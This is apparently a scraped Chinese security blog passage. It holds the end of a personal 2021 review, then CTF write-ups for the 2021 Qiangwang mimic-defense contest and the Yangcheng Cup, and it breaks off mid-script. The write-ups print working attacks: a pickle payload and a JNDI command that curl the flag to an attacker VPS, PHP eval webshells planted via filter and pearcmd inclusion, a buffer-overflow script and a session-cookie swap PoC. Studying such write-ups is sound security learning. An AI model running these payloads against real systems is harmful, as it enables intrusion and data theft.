后面花了1周多时间完成论文大体内容。论文查重率不到1%，导师看我工具对比商业工具和开源工具做审计Python都有不错的优势，于是让我准备一下申请优秀论文和毕设，顿时感觉这两个多月来的付出有些回报，又开始整精简版，英文版，丰富一下论文数据，和完善一波工具代码和强化一下工具的实际应用场景，如集成在DevSecOps下。虽然有一部分原因是因为没啥时候写UI了（评委老师都喜欢花里胡哨的界面），开始把Gitlab、Jenkins和SonarQube搭建起来，模仿企业的流水线并跑通，让工具更具有工程意义。最后也拿下了优秀毕业论文和毕设，这里非常感谢我导师，半夜4，5点还发消息告诉我改这改那（： 总体来说，做完这次毕设，收获真的很大，完整看完一个优秀的开源项目，真的学到了很多，以前我觉得我学的Python都是假的。 6月 放飞自我其实5月初毕设和论文大体搞定，这时也在摸鱼和工作室小伙伴经常参加CTF了，有过大三渗透实习和前面实习在加上这两个多月多了好几套题，这会终于不像大一二那会，啥题都不会做了，参加了第一届广东省大学生网络安全大赛，终于第一次过了CTF初赛，后面决赛AWD，最终拿下省赛总决赛二等奖，师弟也超级给力。也算是完成了自己开始学网安以来，拿一次奖的心愿～ 期间也参加了2021第四届中国强网杯，排名前10%，拿了个强网先锋证书。虽然成绩不算特别好，但是自己带飞队友的感觉，真的很爽！第一次在国赛解出这么多题目～ 而且国赛的一个AST题目和我毕设息息相关，哈哈 期间也陆陆续续参加大大小小的CTF，就没试过没解出来题目的，感觉CTF能勤奋刷题，能有方法刷题，也没有那么的难，以前还是刷题太少了，23333 7-9月 入职 &amp; CTF训练营 &amp; 转正想起期间我实习导师还经常问我有没有面其他厂，生怕我跑路了一样，2333。入职期间，因为有过实习经验，工作也比较顺心应手。入职一开始编制是在创新研究院，但实习期间感觉私有云和托管云也挺有兴趣的，之前组长也有说后续会在我们这边专门整个云安全相关团队，后面找了组长，组长帮忙调了过来。 回到学校这边，想着把学校的CTF搞起来，利用业务时间和工作室几位伙伴一起整了个 CTF暑期打卡计划 （共2个月），希望能把一些东西传承下去吧，怎么说呢师弟师妹们其实积极性也还算好，我这边跟进的也算可以，看每周总结，任务啥的基本不会咕，也很到位，平台也是自费掏钱买的，CTF我相对熟点，带的自我感觉也还算好吧也很用心，也会把展示很多实战案例。后面的渗透 Challenger，带的很好，内容很干货。其实一切都还好，大家也都挺有激情，期间也没有同学退出。从训练营来说，好像也没啥地方有什么差错。就是完成后，我们没有下任务后，也就是现在看来，Web这边后续能够自己持续学习的，持续交流的基本没有，也挺可惜的吧。 在回到工作，一方面在同产品线有实习经历了，然后毕设也和公司效能提升，走DevSecOps一致，各种产出也勉强看的过去，导师也推荐我提前转正，后面没想到的就是，大佬们也给我评了优秀转正，感谢各位大佬在我试用期期间带飞。 10-12月 上班dog的业余国庆回家，最让我惊喜的是，可能这几个月来一直坚持运动和良好作息，某天去朋友家看到秤称了一下，竟然瘦下来了，怪不得个个看到我都说我瘦了，体重直接从 160 到 138 ！ 9月的时候，其实已经和几位同事大佬组了个小团队，打打CTF的，到11月打了几次成绩也还可以～，比如羊城杯也企业组13名，2021第四届“强网“拟态防御国际精英挑战赛，人生第一次和队友一起AK Web！，6个，我解了3个这样子。 但不知为啥AK后就开始萎靡不振，开始其他方向，（可能老底吃尽了，前面也没啥时间刷题，光着搞传承去了，刷题少了），这时 Challenger 师傅推荐我去挖众测，他手把手带飞我。之前也想过要不要做点什么副业，有另外一份收入。从目前挖了1个多月来看，收入也还算可观吧～ 虽然比起大佬们差远了。 第一个项目运气比较好，交了挺多洞，，就被 西瓜🍉师傅 找上门来了，问我要不要去他团队耍耍。团队也挺多大佬的，平常我主要帮忙打打杂，偶尔听听大佬们分享，我甚至还把我和同事原本组的小团队都给撬过来了（逃 游玩 莲花山公园，校招小分队 白云山，和室友去浪 东门+文和友，和同学去的时候比较晚，很多店面都关门了，23333 沙趴看海，和好基友看日落，吃海鲜 仙湖植物园，和同学去拜佛.jpg 地王大厦69层看深圳夜景，久违面基 欢乐港湾滨海文化公园，和同事去逛逛 吃的倒是挺多的（ 照骗放张和好基友去看日落的，原来家里那边的海还挺好看，2333 目标达成回顾一些flag，基本没有一个全部拔掉的，都是做着做着，被其他东西搞去了 SDL，把实习学的做个总结并做一些拓展，60% 云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到，30% 二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少，40% 代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~ 20% 刷完sqli-lab靶场，30% bypass disable function 所有场景实操，0% 完成了一直以来想完成的心愿，也是今年带给我的一些惊喜吧～ CTF Web AK CTF 带飞队友 CTF打进决赛并获奖 第一次做Github给不认识的提PR，向Oneforall 修复了2个Bug，也第一次收到了别人的PR，然后自己也整了个wx机器人玩玩啥的，还挺不错 感谢今年各位带飞，今年达成的心愿，获的的奖，得到的成长，得到的开心，感觉一个人真心啥都干不好.jpg 展望又到了立 flag 环节 考 PTS 考 CISP 读完 frp 源码，巩固Go，并针对红队使用场景做一些优化 sqlilab靶场（这次一定","categories":[{"name":"总结","slug":"总结","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"小记","slug":"总结/小记","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"2021第四届“强网”拟态防御国际精英挑战赛 Writeup","slug":"2021/2021nitai","date":"2021-10-25T14:22:35.000Z","updated":"2022-02-01T04:23:35.213Z","comments":true,"path":"/p/2021/2021nitai/","link":"","permalink":"https://tari.moe/p/2021/2021nitai/","excerpt":"","text":"又和几个**”社会”**人士一起组队参加了这次比赛 这次 Web 和队友一起 AK了，开心 23333 （想起来以前一个题都做不出来的画面… 部分题目下载链接： 2021nitai-misc.7z 2021nitai-web.7z 2021nitai-crypto.7z Web0x1 zerocalc@tari @DEADF1SH-CAT 把能下的都下下来，特别是 package.json，一开始忘了下了晕，然后 snyk 一下扫出两个，感觉是 https://snyk.io/vuln/SNYK-JS-NOTEVIL-608878 因为本地调试直接用safeEval可以利用到nodejs的Function对象， 12var code = &quot;function fn() &#123;&#125;;var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();properties.pop();&quot;console.log(safeEval(code)) 不过加了题目的safeEval就是跑到就被拦截 12//HACK: esprima doesn&#x27;t like returns outside functionssrc = parse(&#x27;function a()&#123;&#x27; + src + &#x27;&#125;&#x27;).body[0].body 不知咋绕过 后面不知被哪位大佬改了 flag 位置，就直接捡漏了， 0x2 ezPickle@tari 查看题目源码发现是pickle反序列化的白名单+黑名单机制，并会动态加载其他模块 12if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) 也就是说，只要引入到模块是 config，且不访问模块内置变量即可绕过pickle反序列化限制 config.py 中存在任意代码执行，只要想办法把 notadmin = {“admin”: “no”} 字典值篡改即可 通过编写OPCODE，在 backdoor 执行前修改 config 命名空间的 notadmin 字典值，这里可以借助工具在OPCODE中修改字典的值 https://github.com/eddieivan01/pker 12notadmin = GLOBAL(&#x27;config&#x27;, &#x27;notadmin&#x27;)notadmin[&quot;admin&quot;]=&quot;yes&quot; 绕过 admin 限制后，通过 OPCODE调用后门 1234cconfigbackdoor(S&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;tR 相应指令解释，其中 . 表示结束 c：把一个全局对象压入栈 (：向栈中压入一个MARK标记 S：实例化一个字符串对象 t：寻找栈中的第一个MARK，并组合其至栈顶的数据为元组 R：选择离栈顶的最近的第一个对象作为参数（必须为元组）、第二个对象作为函数，然后调用该函数 POC 12345678910111213141516171819202122import ioimport sysimport pickleimport base64from config import notadminclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;&#x27;%s.%s&#x27; not allowed&quot; % (module, name))def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()payload = b&quot;&quot;&quot;cconfig\\nnotadmin\\np0\\n0g0\\nS&#x27;admin&#x27;\\nS&#x27;yes&#x27;\\nscconfigbackdoor(S&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;tR.&quot;&quot;&quot;print(base64.b64encode(payload))restricted_loads(payload) 把输出的base64字符串拼接到目标机器GET请求name字段即可，因为无回显，所以外带 0x3 EasyFilter@Oah 题目源码 1234567891011121314151617&lt;?php ini_set(&quot;open_basedir&quot;,&quot;./&quot;); if(!isset($_GET[&#x27;action&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; if($_GET[&#x27;action&#x27;] == &#x27;w&#x27;)&#123; @mkdir(&quot;./files/&quot;); $content = $_GET[&#x27;c&#x27;]; $file = bin2hex(random_bytes(5)); file_put_contents(&quot;./files/&quot;.$file,base64_encode($content)); echo &quot;./files/&quot;.$file; &#125;elseif($_GET[&#x27;action&#x27;] == &#x27;r&#x27;)&#123; $r = $_GET[&#x27;r&#x27;]; $file = &quot;./files/&quot;.$r; include(&quot;php://filter/resource=$file&quot;); &#125; 读文件可控的就只有 php://filter/resource=$file ，之前刷过相关的题目，印象中 resource= 后是不能加过滤器的，然后队友解出来了，问他他说：发现文件名被识别成过滤器了 这样就好办了，写入 base64 编码过的一句话，通过base64解码过滤器读就行 POC 写入 1http://124.70.181.14:32766/?action=w&amp;c=%3C?php%20eval($_GET[%22cmd%22]);?%3E 读取 1http://124.70.181.14:32766/?action=r&amp;r=read=convert.base64-decode/../d7376a8618&amp;cmd=system(%27cat%20../../../flag%27); 0x4 Jack-Shiro@Oah @tari 这题主要是队友解，一开始我都没想到原来我刷过，然后刷过，又刚好有公网服务器，又刚好服务器上有 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，就做个帮忙拿flag工具人，这里复盘一下，两个题目的差别，以及自己去做的话，思路会怎样吧，然后和队里大佬的差异。有兴趣可以到buu去复现2021红明谷JavaWeb 和2021红明谷 JavaWeb 基本一致，但不同的是，这里没有提示 /login 目录，红明谷是有的 不过题目名字有提示，是Shiro，队里大佬说Shiro的默认登陆路径就是这个，直接访问 /login 没啥反应，就返回一个 /json 二话不说，先随便 POST 点JSON数据上去。 POST /json 返回302跳转 记起shiro有个未授权漏洞，有几种绕过姿势，最终锁定CVE-2020-11989 1POST /;/json 在结合题目名字，Jack -&gt; Jackson，这里和红明谷也不一样，原题报错是下图这样的，即 xxx.jackson.databind.xxx 然后就很容易联想到去网上搜 jackjson databind 漏洞 除去一些漏洞通告，第一个漏洞分析就是了 https://www.anquanke.com/post/id/227943 文中最后完整的 payload 是 1String payload = &quot;[\\&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\\&quot;,&#123;\\&quot;jndiLocation\\&quot;:\\&quot;ldap://127.0.0.1:1389/Exploit\\&quot;&#125;]&quot;; 根据这个 payload 试试反序列化 1[&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap://vps:2233/a&quot;&#125;] 报错，提示这个 com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource 类找不到 尝试依次删除类前缀，下面这个就可以 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap://vps:2233/a&quot;&#125;] 可以成功返回数据，那应该是这种利用方式了，但为啥要删除类前缀就不是很清楚，估计题目中把这个包名给换了。 队里大佬说各种找payload，随便找一个就能用了，不像我复现红明谷的时候还有个小坑 然后上 JNDI 利用工具 （ https://github.com/welk1n/JNDI-Injection-Exploit 关于原理，除了可以参考刚刚安全客的文章，还可以看这篇 http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/ 即利⽤LDAP Server返回序列化数据触发反序列化。 这里因服务端 jdk 版本过⾼，⽆法加载远程class，所以用 LDAP 在公网服务器上 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 注意，题目描述是有个压缩包，里面放着 pom.xml 的，里面有些是用Spring开发和版本之类的，然后红明谷就没有，只有未授权访问成功在网页的icon上有一片绿色的叶子，提示这是 Spring… 像下图这样 所以我们运行 JNDI，一定要选JDK（写着 SpringBoot 1.2.x+）的，就可以了 然后发现不知为啥Shell反弹不回来，不过没事，既然我们服务端能接收请求，那服务肯定是出网的，尝试通过 curl 外带 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#x27;curl http://vps_ip:2233 -F file=@/flag&#x27; 从结果而言就题目考点就 Shiro + Jackson 反序列化，但一条龙下来，还是容易踩坑的，2333 0x5 new_hospital@tari 对于完全黑盒的题目，第一步肯定是信息收集，先目录爆破，爆破出来的很多，但实际有用的就3个（从做出来的结果而言，一开始分析的还挺头疼的） 123http://123.60.75.243:32766/old/ http://123.60.75.243:32766/flag.php http://123.60.75.243:32766/feature.php 访问 /flag.php 返回 hacker?在 feature.php 发现个文件读取，不过被拼接 .js 文件后缀 尝试远程读取进来，可以通过URL特性截断 .js ，但写入为JS代码了，无法解析为PHP代码http://123.60.75.243:32766/feature.php?&amp;id=http://VPS_IP/in.php%3F%2500 仔细看，发现通过这个文件读取接口会返回一个Cookie 解码发现是刚刚提交的目录，注意文件后缀已经拼接了 .js（待会用到） 后面翻目录爆破出来的，访问 /old/feature.php 发现竟然和我刚刚访问在 /feature.php 提交的一样，开始寻思这是缓存？ 是不是 file_get_content + file_put_content 呢？尝试 php filter 过滤器差异化写入无果，突然想到刚刚的Cookie，难道/old是通过Cookie里的目录设置的文件包含的内容？这样刚好可以直接无视 .js 后缀，然后结合目录爆破出来的 flag.php 是不是就能读到什么… 验证一下 0x6 Give_me_your_0day@Oah install.php 608 行有个文件包含 1/install.php?config&amp;dbAdapter=[路径] 查到可以用 /usr/local/lib/php/pearcmd.php 利用 很多目录都没有写权限，但是发现/tmp目录可以写 写木马 12345678910GET /install.php?config&amp;+-c+/tmp/a.php+-d+man_dir=&lt;?eval($_GET[&quot;cmd&quot;]);?&gt;/*+-s+list&amp;dbAdapter=../../../../usr/local/lib/php/pearcmd&amp;&amp;XDEBUG_SESSION_START=PHPSTORM HTTP/1.1Host: 121.36.229.59:32767Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://121.36.229.59:32767/install.php?configAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: __typecho_lang=zh_CNConnection: close 读flag 12345678910GET /install.php?config&amp;dbAdapter=../../../../tmp/a&amp;cmd=system(&#x27;cat+/flag&#x27;); HTTP/1.1Host: 121.36.229.59:32767Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://121.36.229.59:32767/install.php?configAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: __typecho_lang=zh_CNConnection: close PWN0x1 sonic @小火车 ida查看gets函数存在栈溢出，将输入的登录名溢出到RSP通过ida查看不用登录的地址偏移在0x73a 通过python直接获取远程服务器main地址为0x00005555555547cf 用patternLocOffset.py计算得到偏移量为40 1234567from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)sh = remote(&#x27;123.60.63.90&#x27;,6888)payload = &#x27;A&#x27;*40+p64(0x000055555555473a)sh.recvuntil(&#x27;login:&#x27;)sh.send(payload)sh.interactive() CRYPTO0x1 拟态签到题解压压缩包，flag.txt base64解码得到flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT} MISC每个题都只做了前面一点，后面不太会，@LI 大佬NB~ 0x1 WeirdPhoto@LI @tari 一开始1.png 不知道是啥…，突然发现win下是可以打开看的，经典的高度或者宽度被修改了，通过png crc计算出图片原来的宽高 12345678910111213141516import binasciiimport struct# 打开图片crcbp = open(&quot;/Users/tari/Downloads/1.png&quot;, &quot;rb&quot;).read()# 假设原图片大小在 2000x2000以内for i in range(2000): for j in range(2000): data = crcbp[12:16] + \\ struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j) + crcbp[24:29] crc32 = binascii.crc32(data) &amp; 0xffffffff # 图片当前CRC, 即 0x9e916964 为 CRC, 对应16进制编辑器里 00000010h d-f 和 00000020h 0 if (crc32 == 0x9e916964): print(i, j) print(&#x27;hex:&#x27;, hex(i), hex(j)) 输入右边的英文 TIEWOFTHSAEOUIITNRBCOSHSTSAN 密码不对 解出压缩包密码：THISISTHEANSWERTOOBSFUCATION 里面一堆图片，但直接把 out 丢进16进制编辑器可以看到一堆 obj，所以猜 是个PDF，修复一下文件头 搜一下 PDF 隐写，发现很多都是用的 wbStego4，下个wbStego4，默认选项解密，然后保存输出为txt，就能得到flag 0x2 bar@LI @小火车 @tari 官方提示： 观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符 flag内容都是小写英文字母 根据题目名称，得知是一个条形码，然后把 GIF每一帧拼接一下即可，网上找个脚本魔改了一下 https://blog.csdn.net/Cony_14/article/details/102730294 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import osfrom PIL import Image# 工作目录, 会在该目录生成大量临时文件, 尽量新建文件夹运行哈FILE_ROOT = &#x27;/Users/tari/Downloads/gif&#x27;# 待处理图片GIT_PATH = os.path.join(FILE_ROOT, &#x27;output.gif&#x27;)# GIF每张图片宽度IMAGE_WIDTH = 20# GIF每张图片高度IMAGE_HEIGHT = 100# 最终输出图片高度, 如果过长可以稍微调节下, 一般 100 足够了TARGET_HEIGHT = 100# 输出图片名称OUTPUT_IMAGE = &#x27;new_im.png&#x27;im = Image.open(GIT_PATH)# 打开一个序列文件时，PIL库自动加载第一帧, 保存第一帧到当前目录下im.save(os.path.join(FILE_ROOT, str(im.tell()) + &#x27;.png&#x27;))# 计数有多少帧image_cnt = 1try: while 1: # 向下一帧移动 im.seek(im.tell() + 1) # 保存下一帧 im.save(os.path.join(FILE_ROOT, str(im.tell()) + &#x27;.png&#x27;)) image_cnt += 1except EOFError: pass# 创建宽度为image_cnt*IMAGE_WIDTH，高度为100的空白新照片new_im = Image.new(&#x27;RGBA&#x27;, (IMAGE_WIDTH * image_cnt, IMAGE_HEIGHT))im_list = []for i in range(0, image_cnt): im_list.append(Image.open(os.path.join(FILE_ROOT, str(i) + &#x27;.png&#x27;)))width = 0for im in im_list: # 将各个图片对象im粘贴到新图片上，图片的左上角和右下角坐标分别为width,IMAGE_WIDTH,width+IMAGE_WIDTH,IMAGE_HEIGHT new_im.paste(im, (width, 0, width + IMAGE_WIDTH, IMAGE_HEIGHT)) width = width + IMAGE_WIDTH# 宽度不变, 必要时填充高度new_im = new_im.resize((width, TARGET_HEIGHT))# 保存成新文件new_im.save(os.path.join(FILE_ROOT, OUTPUT_IMAGE))new_im.show() 这条形码怪怪的感觉 然后发现参考资料： [http://www.appsbarcode.com/Code%2093.php](http://www.appsbarcode.com/Code 93.php) START是111141，用PS自动生成参考线，把每9位都写出来。可以看到，前面虽然存在一些不是黑白的颜色，但是发现后面也有START标志，不会被前面影响。 前面30个字符就可以整理出来了，是：F0C62DB973684DBDA896F9C5F6D962 还差两个字符，提示是停止符号的前两个，也就是上面那个check digit 这里可以直接生成一个新的条形码，然后得到两个检查位 对照表格，分别是W和space 组合起来就是，F0C62DB973684DBDA896F9C5F6D962W[space] 整理卡了半天。。。后面跑去问是不是题目错了。。 得到的答复是 小写生成的条码是没有w和空格的 条形码解出来的不是全大写的嘛，标准就是呀 也就是说不是用 F0C62DB973684DBDA896F9C5F6D962 去生成条形码，而是用小写 f0c62db973684dbda896f9c5f6d962 去生成 http://barcode.cnaidc.com/html/BCGcode93.php 算了一下发现两个检查位分别是 221121(U) 和 111222(M) 最终flag flag&#123;f0c62db973684dbda896f9c5f6d962um&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"2021羊城杯部分 Writeup","slug":"2021/2021ycb","date":"2021-09-12T12:28:45.000Z","updated":"2022-02-01T04:24:32.659Z","comments":true,"path":"/p/2021/2021ycb/","link":"","permalink":"https://tari.moe/p/2021/2021ycb/","excerpt":"","text":"和几个**”社会”**人士（@DEADF1SH-CAT、 @Oah、 @小火车）一起组队参加了这次比赛，终于不用在高校组卷了，哈哈 部分题目下载链接： 2021ycb-misc.7z 2021ycb-web.7z 2021ycb-crypto.7z 9.17更：官方WP：https://mp.weixin.qq.com/s/BqLTX3au1GIPn3cz9xZISA MISC0x01 签到题不想吐槽，一起来看流星雨对应数字17。。队伍里师傅太骚，我是没想到 2333 gif图每一帧都对应一个数字 28定律-8卦-30而立-北斗7星-4才子-歼20-2只黄鹂-17来看流星雨-乔丹球服23-1马当先-12星座-新闻联播19点开播放 所以是 md5(28-08-30-07-04-20-02-17-23-01-12-19) Sangfor{d93b7da38d89c19f481e710ef1b3558b} 0x05 Misc520 题目简介：有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。 1、首先解压缩520次，顺便打印文件内容（一开始没发现，后面做出来后试了n个组合都不对…），并得到一张图片flag.png 123456789101112131415161718import zipfileROOT_DIR = &#x27;/Users/tari/Downloads/rezip/&#x27;def unzip(file_name): f = zipfile.ZipFile(file_name, &#x27;r&#x27;) for file in f.namelist(): f.extract(file, ROOT_DIR) if file.startswith(&#x27;story&#x27;): with open(ROOT_DIR + file, &#x27;r&#x27;) as fr: print(fr.read())for i in range(520, -1, -1): print(i) name = ROOT_DIR + str(i) + &#x27;.zip&#x27; unzip(name) 顺便在150.zip 压缩包的 story文件的发现 2、获取到图片后通过zsteg提取flag.pcap 1zsteg flag.png 3、发现里面还有个压缩包，一开始还以为提取错了… 1steg flag.png -e b1,bgr,lsb,xy &gt; flag.zip 4、压缩包有密码，这个安利 john，很快 12zip2john 8.zip &gt; passwd.hashjohn passwd.hash 5、打开压缩包发现是USB流量，通过USB流量分析文章，得知获取鼠标数据方式 1tshark -r flag.pcap -T fields -e usb.capdata &gt; usbdata.txt 6、将usbdata.txt通过以下脚本，运行 python xxx.py &gt; usb.txt 输出得到鼠标的坐标点 1234567891011121314151617181920nums = []keys = open(&quot;usbdata.txt&quot;, &quot;r&quot;)posx = 0posy = 0for line in keys: if len(line.strip()) != 8: continue x = int(line[2:4], 16) y = int(line[4:6], 16) if x &gt; 127: x -= 256 if y &gt; 127: y -= 256 posx += x posy += y btn_flag = int(line[0:2], 16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 0: // 1是鼠标左键 2是右键 0是默认 print(posx, posy) nums.append((posx, posy))keys.close() 这里注意，可能文章里的格式是 00:00:01:00:00:00:ff:ff 这种，这应该是旧版 tshark获取到的，新版应该都是 00ffff00 格式，上面脚本也是适应这种格式 7、通过gnuplot绘图 plot usb.txt 得到 130，63，111，94，51，134，119，146 然后配合刚开始在一个story文件找到这个 72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108 由于题目提示说开头是GWHT，测试了一下ascii码依次是71，87，72，84，可以得到数字一次减小1、2、3、4....21脚本如下得到flag 最后flag:GWHT{W3lCom3_t0_M!sc}，替换头部字符串Sangfor{W3lCom3_t0_M!sc}，提交成功 Web0x01 Cross The Side 等WP补充版本信息： Laravel8.26.1 / PHP7.4.15 先尝试一下 Laravel8 CVE-2021-3129不过报了个错，好像是分配的内存不够 有点迷，以前复现的时候没遇到这两个报错 相关的反序列化好像要找参数接收入口点，不过爆破一下接口暂时没发现。。 0x02 Checkin_Go跑登录hash脚本 1234567891011import hashlibtarget = &#x27;0a7610&#x27;candidate = 0while True: plaintext = str(candidate) hash = hashlib.md5(plaintext.encode(&#x27;ascii&#x27;)).hexdigest() if hash[:6] == target: print(&#x27;plaintext:&quot;&#x27; + plaintext + &#x27;&quot;, md5:&#x27; + hash) break candidate = candidate + 1 帐号密码 tari/tari + 得到的 hash 即可登录，审计源码发现通过checkNowMoney和checkPlayerMoney校验用户的Money和买flag需要的Money，但secret我们不清楚，没法直接伪造。直接base64解码两次，看看Cookie里装的什么东西，其中蓝色的为加密过的内容，即 checkXXX 然后这两个checkXXX，后端校验逻辑为只要能解密内容能解密成功，就行，没有严格校验绑定对应的键是否正常。 但是因base64了两次，直接通过base64 4字节是否对齐替换太麻烦了，直接用gin来替换即可，POC如下 1234567891011121314151617181920212223242526272829303132333435package mainimport ( &quot;github.com/gin-contrib/sessions&quot; &quot;github.com/gin-contrib/sessions/cookie&quot; &quot;github.com/gin-gonic/gin&quot; &quot;math/rand&quot;)func randomChar(l int) []byte &#123; output := make([]byte, l) rand.Read(output) return output&#125;func main() &#123; r := gin.Default() storage := cookie.NewStore(randomChar(16)) r.Use(sessions.Sessions(&quot;o&quot;, storage)) r.GET(&quot;/&quot;, func(c *gin.Context) &#123; s := sessions.Default(c) s.Set(&quot;uname&quot;, &quot;tari&quot;) checkPlayerMoney := s.Get(&quot;checkPlayerMoney&quot;) checflagMoney := s.Get(&quot;checkNowMoney&quot;) // 交换 现有的money 和 买 flag money 加密后的值 s.Set(&quot;checkNowMoney&quot;, checkPlayerMoney) s.Set(&quot;checkPlayerMoney&quot;, checflagMoney) playerMoney := s.Get(&quot;playerMoney&quot;) flagMoney := s.Get(&quot;nowMoney&quot;) s.Set(&quot;nowMoney&quot;, playerMoney) s.Set(&quot;playerMoney&quot;, flagMoney) s.Save() &#125;) r.Run(&quot;0.0.0.0:80&quot;)&#125; 首先帐号密码 tari/tari + hash 登录，然后把Cookie提取取来，在本地浏览器替换，访问本地刚刚POC建的HTTP服务即会替换 然后就把Set-Cookie的值替换到比赛环境，访问比赛环境即会看到Money额flag钱对换位置了 在点buyFlag即可得flag 0x03 Only 4没成功的思路： 1、目录爆破得知存在文件 secret.php 2、伪协议可读/etc/passwd （/?gwht=php://filter/convert.base64-encode/resource=/etc/passwd&amp;ycb=1）但读不了 secret.php 3、反序列化不是很明白咋利用。。 通过下面非预期解命令执行后，发现原来还有个 serialize.php 文件，，我30w字典都没有，kali自带的也没有，辣鸡题目。预期解是，目录爆破得 serialize.php 然后构造POP链，得到 secret.php 然后通过 &gt; 写shell得到flag 以下应该为非预期解： 尝试文件包含 /var/log/httpd/access.log access_log error.log error_log 和 /var/log/apache2/access 等等日志文件，均没成功。 尝试通过伪协议读 /proc，读了 /proc/self/cmdline 和 environ但没啥信息，仔细想想apache既然在运行，肯定还会有相关的文件描述符，按理说，举办方不会ban了这部分的日志才对。通过burp爆破一下 /proc/self/fd/数字 那咋整，，果断向举办放，让他们帮我重置环境。。。 重新来一次，UA写入&lt;?php @eval($_GET[&#39;c&#39;]); ?&gt; 成功，发现flag在根目录下 0x04 Shop System 等WP补充据说源码是：https://gitee.com/agoni_no/gulimall 1、明显是fastjson, @type被禁用，考虑绕过， 2、通过unicode编码绕过，可以打dnslog 3、拿到jdk信息-&gt; /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.302.b08-0.el7_9.x86_64/jre 4、可以拿到报错的调用栈(但是好像没用) 5、估计版本&gt;=1.2.67 0x05 NO SQL 等WP补充1、目录爆破得源码 backup.zip 2、发现用户Sangfor，重置密码显示 Invalid address: (From): root@localhost 3、找不到NoSQL注入注入点 0x06 EasyCurl 等WP补充1、访问 /app 敏感信息泄漏，知道登录帐号和密码两个 2、举办方提示 /common.php.bak 3、目录爆破发现 admin.php config.php login.php 还有个 log/ 目录里面记录了登录信息 4、不知道咋触发cache_parser 的魔术函数 Crypto0x01 RingRingRing一共有两个挑战 第一个是算出md5符合要求的字符串，直接从1开始爆破 第二个是计算a**4 + b**4 + c**4 + d**4 == e**2 当abcd相同时，可以转换成 4*a**4==e**2 再进一步转换 e = 2*a*a 最后爆破出100个就行了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import hashlibimport socketimport redef md5(plain): return hashlib.md5(plain.encode()).hexdigest()def challenge_1(s): # 读题 msg = s.recv(1024).decode() print(msg, end=&quot;&quot;) salt, target = re.findall(r&quot;md5\\(str \\+ (.*?)\\)\\[0:5\\] \\=\\= (.*)&quot;, msg)[0] msg = s.recv(1024).decode() print(msg, end=&quot;&quot;) # 解题 i = 0 while 1: result = str(i) hash_text = md5(result + salt)[0:5] if hash_text == target: print(result) s.send(result.encode()) return i += 1def challenge_2(s): # 读题 msg = 